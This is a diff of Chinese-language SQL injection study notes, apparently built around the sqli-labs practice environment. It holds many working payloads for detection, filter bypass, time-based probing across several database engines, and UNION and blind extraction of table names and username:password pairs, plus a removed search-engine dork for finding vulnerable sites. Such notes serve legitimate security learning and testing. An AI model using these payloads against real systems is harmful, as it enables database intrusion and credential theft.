@@ -10,40 +10,61 @@ POST: username=payload
 Cookie: uid=payload
 ```
 
+> 有时 SQLi 需要末尾添加注释符 `-- ` 才能执行, 其中仅用于 MySQL 有另一个注释符 `#` ;
+>
+> 注意添加注释时需要闭合 `''` , `""` 和 `()` ; 注意语法要符合 `Types` .
+
+> 在 Burp 中测试必须将特殊符号进行 URL 编码.
+
 ## 2. Detection
 
-检测是否存在 SQLi
+检测是否存在 SQLi, 并判断闭合方式
 
 这里推荐使用 [SQLi Query Tampering](https://portswigger.net/bappstore/86549d1076bd485aa84c2c2685bd9ffd) 生成 Payload
 
 ### 2.1. Error
 
-传入特殊字符触发报错, 添加注释符 `-- ` , `--+` , `#` 后正常
+传入特殊字符触发报错, 添加注释符后正常
 
 ```
 '
 "
-;
 )
+')
+")
+;
 *
+\
+%CA%BA
+%CA%B9
 ```
 
 常见的 Bypass 有 URL 编码和双重 URL 编码
 
-> 其中 `U+02BA` 和 `U+02B9` 在编码后传入可能被误判为 `U+0022` 和 `U+0027` 从而实现注入
+> 其中 `%CA%BA` 和 `%CA%B9` 为 `U+02BA` 和 `U+02B9` 的 URL 编码, 可能被误判为 `U+0022` 和 `U+0027` 从而实现注入
 
 ### 2.2. Bool
 
 使用恒等条件判断, 若为 `true` 则返回数据, 若为 `false` 则没有数据
 
+> 亦可作为常见的闭合方式示例
+
 ```
-/test?id=1 or 1=1  # true
-/test?id=1' or 1=1 # true
-/test?id=1" or 1=1 # true
-/test?id=1 and 1=2 # false
+ OR 1=1        # true
+ AND 1=2       # false
+) OR )1=1      # true
+) AND )1=2     # false
+' OR '1'='1    # true
+' AND '1'='2   # false
+') OR ('1'='1  # true
+') AND ('1'='2 # false
+" OR "1"="1    # true
+" AND "1"="2   # false
+") OR ("1"="1  # true
+") AND ("1"="2 # false
 ```
 
-> 有时需要末尾添加注释符 `-- ` , `--+` , `#` 才能执行
+> 注意添加注释符时需要闭合 `''` 和 `""` 
 
 可通过 Merging characters 来 Bypass
 
@@ -58,89 +79,99 @@ Cookie: uid=payload
 
 ### 2.3. Time
 
-==------==
-
-## 3. PoC
-
-验证 sql 注入的方法
+通过是否执行延时命令判断
 
 ```
-非法数学运算
-id=1/1
-id=1/0
-> 看是否有不同（数据包，响应时间）
+' AND SLEEP(5) --+ # MySQL
+' AND IF(NOW()=SYSDATE(), SLEEP(5), 0) --+ # MySQL
+' XOR (IF(NOW() = SYSDATE(), SLEEP(5), 0)) XOR 'Z # MySQL
+' AND IF(SUBSTRING(@@VERSION, 1, 1) = '5', SLEEP(5), 0) --+ # MySQL
+
+' WAITFOR DELAY '00:00:05' --+ # MSSQL
+
+'; SELECT CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END --+ # PostgreSQL
+
+' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 1 END FROM DUAL)--+ # Oracle
+```
+
+使用 URL 编码避免报错
+
+## 3. DBMS
+
+### 3.1. MySQL
+
+支持十六进制编码, `table_schema='dvwa'` 可修改为 `table_schema=0x64767761` 以绕过对 `''` 和 `""` 的转义
+
+元数据库 `information_schema` 
+
+- 数据表 `tables` 存储了所有数据库中的所有表的信息
+
+  > 字段 `table_schema` 存储数据库名
+  >
+  > 字段 `table_name` 存储该数据库下的表名
+
+- 数据表 `columns` 存储了所有的数据表和字段的关系
+
+  > 字段 `table_schema` 存储数据库名  
+  >
+  > 字段 `table_name` 存储表名  
+  >
+  > 字段 `column_name` 存储对应表中的字段名
+
+## 4. Types
+
+仅代表 SQLi 参数类型, 与闭合方式无关.
+
+### 4.1. Number
+
+```
+SELECT * FROM sec WHERE id = 1
 ```
 
 ```
-id=1' waitfor delay '0:0:5'--+
-id=1' union select 1,@@VERSION,3--+
-
-0%27XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR%27Z
-若存在 SQL 注入则睡眠 3 秒
+?id=1\
+?id=1         # success
+?id=x         # error
+?id=1 OR 1=1  # true
+?id=1 AND 1=2 # false
+?id=1/1       # true
+?id=1/0       # false
 ```
 
-判断 sql 查询类型
+### 4.2. String
 
 ```
-id=1'||(seletc '')||'
-id=1'||(seletc '' from dual)||'
+SELECT * FROM sec WHERE id = '1'
+SELECT * FROM sec WHERE id = "1"
 ```
 
-在 SQL 查询中，`OR` 运算符具有短路求值的逻辑。这使得在查询中加入恒为真的条件（如 `1=1`）会使得整个 `WHERE` 子句总为真，从而返回所有记录。
-
 ```
-SELECT * FROM products WHERE category = 'Gifts' OR 1=1
-```
-
-登录框处的 sql 注入
-
-```
-SELECT * FROM users WHERE username = 'administrator'--+' AND password = ''
+?id=1\
+?id=1'             # error
+?id=1"             # error
+?id=1' OR '1'='1   # true
+?id=1" OR "1"="1   # true
+?id=1" AND '1'='2  # false
+?id=1" AND "1"="2  # false
 ```
 
-## 1 MySQL 的 SQL 注入
-
-1. **布尔测试：**
-
-   ```
-   ?id=1' AND SLEEP(5)--
-   ?id=1' AND 1=2 UNION SELECT 1,2,3--
-   ```
-
-2. **时间延迟测试：**
-
-   ```
-   ?id=1' AND SLEEP(5)--
-   ?id=1' WAITFOR DELAY '0:0:5'--
-   ```
-
-3. **报错注入：**
-
-   ```
-   ?id=1' UNION SELECT 1,@@VERSION,3--
-   ```
-
-## 2 分类
-
-数字型
+### 4.3. LIKE
 
 ```
-select * from sec where id=1
+SELECT * FROM sec WHERE id LIKE '%1%'
 ```
 
-字符型
-
 ```
-select * from sec where id='1'
-```
-
-搜索型
-
-```
-select * from sec where id like '%1%'
+?id=1              # 多个结果
+?id=%1%            # 多个结果
+?id=1% OR 1=1      # 多个结果
+?id=1%' OR '1'='1  # 多个结果
+?id=1%" OR "1"="1  # 多个结果
+?id=%'%            # error
+?id=%"%            # error
 ```
 
-json型
+### 4.4. JSON
 
 ```
 {
@@ -148,257 +179,131 @@ json型
 }
 ```
 
-## 4 查找
-
-谷歌语法：`inurl:"php?id=" site:".com.cn"`
-
-## 5 判断是否存在 SQL 注入
-
-1. **布尔测试：**
-
-   ```
-   ?id=1' AND SLEEP(5)-- 
-   ?id=1' AND 1=2 UNION SELECT 1,2,3-- 
-   ```
-
-2. **时间延迟测试：**
-
-   ```
-   ?id=1' AND SLEEP(5)-- 
-   ?id=1' WAITFOR DELAY '0:0:5'-- 
-   ```
-
-3. **报错注入：**
-
-   ```
-   ?id=1' UNION SELECT 1,@@VERSION,3-- 
-   ```
-
-4. **顺序注入**
-
-   ```
-   ?id=1 order by 1
-   ?id=1 order by 100
-   ```
-
-### 5.2 字符型
-
-尝试传递特殊字符 `` `
-
-```
-http://192.168.1.76/sqli-labs/Less-1/?id=1'
-```
-
-> 当传递 `'` 时报错
-
-添加注释使之正常访问
-
-```
-http://192.168.1.76/sqli-labs/Less-1/?id=1' --+
-```
-
-> 在 mysql 中提交 `+` 相当于空格
-
-或者手动闭合
-
-```
-http://192.168.1.76/sqli-labs/Less-1/?id=1' and '1
-```
-
-> 返回正常说明存在 SQL 注入
-
-### 5.3 搜索型（待补充）
-
-```
-1%' and 1=1 and '%'='
-```
-
-### 5.4 json型（待补充）
-
 ```
 {
-    "id":"1 and 1=1"
+  "id": "1' OR '1'='1"  # true
+}
+
+{
+  "id": "1' AND '1'='2" # false
+}
+
+{
+  "id": "' UNION SELECT NULL, VERSION()"
+}
+
+{
+  "id": "1' AND SLEEP(5)"
+}
+
+{
+  "id": "1' AND LENGTH(DATABASE())>0"
 }
 ```
 
-## 6 判断闭合方式
+## 5. Column count
 
-### 6.1 字符型
-
-输入反斜杠 `\` 来判断页面使用的哪种闭合方式
+利用 ORDER BY 判断有几个字段
 
 ```
-http://192.168.1.76/sqli-labs/Less-1/?id=1\
+?id=1 ORDER BY 4
 ```
 
-> 报错 `'1\' LIMIT 0,1` ， `\` 转义符后的 `'` 被转义，相当于 `'1 LIMIT 0,1` 造成报错，说明此 sql 语句基于 `'` 闭合。
-
-| 常见手动 sql 注入的闭合方式 |
-| :-------------------------: |
-|              '              |
-|              "              |
-|              )              |
-|             ')              |
-|             ")              |
-|             "))             |
-
-## 7 判断字段数量
-
-### 7.1 数字型
-
-提交正确的逻辑，利用 order by 判断有几个字段
-
-```
-http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=1 order by 4
-```
-
-> 当写入使用第 4 个字段排序时报错，说明后台查询有 3 个字段
-
-### 7.2 字符型
-
-浏览器访问
-
->http://192.168.1.76/sqli-labs/Less-1/
-
-使用 HackBar 写入 order by 判断有几个字段，注意闭合
-
-```
-http://192.168.1.76/sqli-labs/Less-1/?id=1' order by 4 --+
-```
-
-> 当写入使用第 4 个字段排序时报错，说明后台查询有 3 个字段
+> 当写入使用第 4 个字段排序时报错，说明后台查询有 3 个字段;
 >
-> 不一定是数据表的字段数，原因是后台查询可能不是 `select *` 可能是 `select id,username` 此时只有两个字段，当 `order by 3`  时即会报错
+> 可尝试二分法.
 
-## 8 联合查询
+## 6. UNION
 
-使用 `union` 的查询方式
-
-> 使用 `union` 时需要使 `union` 之前的语句出现逻辑错误，才会显示之后的反馈
-
-> http://192.168.1.76/sqli-labs/Less-1/
-
-### 8.1 爆显示位置
-
-### 8.1.1 数字型
-
-在 hackbar 提交
+示例
 
 ```
-http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=0 union select 1,2
+SELECT id, username, password FROM users WHERE id = '$id'
 ```
 
-> 查询字段必须相同
+> 使用 `UNION` 时推荐查询 `NULL` 以显示 `UNION` 的查询结果
 
-### 8.1.2 字符型
+### 6.1. Location
 
-已知字段数量为 3 ，在 hackbar 提交
+查询字段必须与 `Column` 相同
 
 ```
-http://192.168.1.76/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+
+?id=NULL UNION SELECT 1,2,3
 ```
 
-> 字符型的错误要注意加闭合符 `'1' union select 1,2,3`
+### 6.2. Database
 
-### 8.2 爆库
+在有回显的位置显示所有数据库名
+
+```
+?id=NULL UNION SELECT 1,2,(SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables)
+```
 
 在有回显的位置显示当前数据库名
 
 ```
-http://192.168.1.76/sqli-labs/Less-1/?id=-1' union select 1,2,database() --+
+?id=NULL UNION SELECT 1,2,DATABASE()
 ```
 
-也可以通过这种方式得到数据库的其它信息
+亦可查询以下内容
 
 | 操作                 | 描述         |
 | -------------------- | ------------ |
-| version()            | mysql 版本   |
-| user()               | 数据库用户名 |
-| database()           | 数据库名     |
-| @@datadir            | 数据库路径   |
-| @@version_compile_os | 系统版本     |
+| VERSION()            | MySQL 版本   |
+| USER()               | 数据库用户名 |
+| DATABASE()           | 数据库名     |
+| @@DATADIR            | 数据库路径   |
+| @@VERSION_COMPILE_OS | 系统版本     |
 
-### 8.3 爆表
+### 6.3. Tables
 
-> 在 mysql 中有一个元数据库 `information_schema` 其中有
->
-> `tables` 数据表，存储了所有数据库和数据表的关系
->
-> > 其中 `table_schema` 字段存储了所有数据库名
-> >
-> > 还有 `table_name` 字段存储了所有数据库对应的表名
->
->  `columns`  数据表，存储了所有的数据表和字段的关系
->
-> > 其中 `column_schema`  字段存储了所有数据表名
-> >
-> > 还有 `column_name` 字段存储了所有数据表对应的字段名
-
-获取当前数据库下的所有数据表
+获取指定数据库的所有数据表名
 
 ```
-http://192.168.1.76/sqli-labs/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
+?id=NULL UNION SELECT 1,2,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='security')
 ```
 
-> 其中 `table_name` 中有很多字段，需要用 `group_concat（）` 组合到一起查看
-
-或者将语句整合（推荐）
+获取当前数据库的所有数据表名
 
 ```
-http://192.168.1.76/sqli-labs/Less-1/?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) --+
+?id=NULL UNION SELECT 1,2,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())
 ```
 
-又或者不用 `group_concat` ，使用 `limit` 分次显示
+### 6.4. Columns
+
+获取指定数据库中指定数据表的所有字段名
 
 ```
-http://192.168.1.76/sqli-labs/Less-1/?id=-1' union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1) --+
+?id=NULL UNION SELECT 1,2,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users')
 ```
 
-得到数据表：emails,referers,uagents,users
-
-### 8.4 爆字段
-
-显示 `users` 数据表中的所有字段
+获取当前数据库中指定数据表的所有字段名
 
 ```
-http://192.168.1.76/sqli-labs/Less-1/?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users') --+
+?id=NULL UNION SELECT 1,2,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users')
 ```
 
-### 8.5 拖库
+### 6.5. Dump
 
-显示 `users` 数据表中的所有数据
-
-```
-http://192.168.1.76/sqli-labs/Less-1/?id=-1' union select 1,2,(select group_concat(username,'_',password) from users) --+
-```
-
-> 其中 `_` 为添加的分隔符，可以替换成任意字符
-
-若数据很多可用 `limit` 分次显示
+获取指定数据库中指定数据表中的所有数据
 
 ```
-http://192.168.1.76/sqli-labs/Less-1/?id=-1' union select 1,2,group_concat(username,'--',password) from (select username,password from users limit 0,1)a --+
+?id=NULL UNION SELECT 1,2,(SELECT GROUP_CONCAT(username,':',password) from security.users)
 ```
 
-> 此时必须设置临时数据表别名 `a`
-
-也可以使用换行显示多条数据
+获取当前数据库中指定数据表中的所有数据
 
 ```
-http://192.168.1.76/sqli-labs/Less-1/?id=-1' union select 1,2,group_concat(username,0x5F,password,0x3C,0x68,0x72,0x2F,0x3E) from (select username,password from users limit 0,4)a --+
+?id=NULL UNION SELECT 1,2,(SELECT GROUP_CONCAT(username,':',password) from users)
 ```
 
-> `0x5F` 为下划线的换行符
->
-> `0x3C,0x68,0x72,0x2F,0x3E` 为换行符的 ascii 码
+## 7. Blind
 
-## 9 布尔盲注
-
-> http://192.168.1.76/sqli-labs/Less-1/
+### 7.1. Bool
 
 当没有回显时，可以根据反馈信息的真假进行注入
 
-### 9.1 爆库
+### 7.1.1. 爆库
 
 判断数据库长度
 
@@ -454,7 +359,7 @@ http://192.168.1.76/sqli-labs/Less-1/?id=1' and ascii(left(database(),3)) > 100 
 http://192.168.1.76/sqli-labs/Less-1/?id=1' and ascii(right(database(),3)) > 100 --+
 ```
 
-### 9.2 爆表
+### 7.1.2. 爆表
 
 判断数据表的个数
 
@@ -474,9 +379,7 @@ http://192.168.1.76/sqli-labs/Less-1/?id=1' and (select count(*) from informatio
 ?id=1' and （select length(table_name）from information_schema.tables where table_schema=database() limit 0,1)=1 --+
 ```
 
-
-
-### 9.3 爆字段
+### 7.1.3. 爆字段
 
 判断字段的个数
 
@@ -490,15 +393,15 @@ http://192.168.1.76/sqli-labs/Less-1/?id=1' and (select count(*) from informatio
 
 > 在 `mysql 5.7` 中新增了 `sys.schema` 基础数据来自于 `performance_chema` 和 `information_schema` 两个库，本身数据库不存储数据
 
-### 9.4 拖库
+### 7.1.4. 拖库
 
-## 10 时间盲注
+### 7.2. Time
 
 当反馈信息没有区别时，可以根据响应时间进行注入
 
 > http://192.168.1.76/sqli-labs/Less-8/
 
-### 10.1 判断是否存在 SQL 注入
+### 7.2.1. 判断是否存在 SQL 注入
 
 尝试传递特殊字符 `` `
 
@@ -516,7 +419,7 @@ http://192.168.1.76/sqli-labs/Less-8/?id=1'
 http://192.168.1.76/sqli-labs/Less-8/?id=1' --+
 ```
 
-### 10.2 爆库
+### 7.2.2. 爆库
 
 判断数据库长度
 
@@ -537,12 +440,6 @@ http://192.168.1.76/sqli-labs/Less-8/?id=1' and if(ascii(substr(database(),1,1))
 > 当数据库的第一个字符 ascii 码长度为 100 时，则正常，否则休眠三秒
 >
 > 最后得到 ascii 码为 150
-
-### 10.3 爆表
-
-### 10.4 爆字段
-
-### 10.5 拖库
 
 ---
 
